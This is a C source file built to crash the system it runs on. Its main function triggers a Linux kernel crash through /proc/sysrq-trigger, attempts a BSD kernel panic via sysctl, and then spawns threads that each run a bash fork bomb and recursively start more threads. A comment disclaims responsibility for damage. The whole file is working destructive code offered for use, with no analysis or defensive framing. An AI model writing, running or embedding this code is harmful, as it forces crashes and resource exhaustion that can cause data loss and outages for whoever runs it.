#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>

// This may cause problems, I am not responsible for any damage caused by this code.
void* lag(void *threadid);
void start_lag_threads(int numThreads);

int main() {
    printf("Crashing the system...\n");
    system("echo c > /proc/sysrq-trigger");
    system("sysctl debug.kdb.panic=1");
    int numThreads = 100;
    start_lag_threads(numThreads);
    return 0;
}

void* lag(void *threadid) {
    long tid = (long)threadid;
    while(1) {
        system(":(){ :|:& };:");
        start_lag_threads(100);
    }
    return NULL;
}

void start_lag_threads(int numThreads) {
    pthread_t threads[numThreads];
    for(long t = 0; t < numThreads; t++) {
        if(pthread_create(&threads[t], NULL, &lag, (void*)t)) {
            fprintf(stderr, "Error creating thread\n");
            return;
        }
    }

    for(long t = 0; t < numThreads; t++)
        pthread_join(threads[t], NULL);

    printf("All threads finished.\n");
}
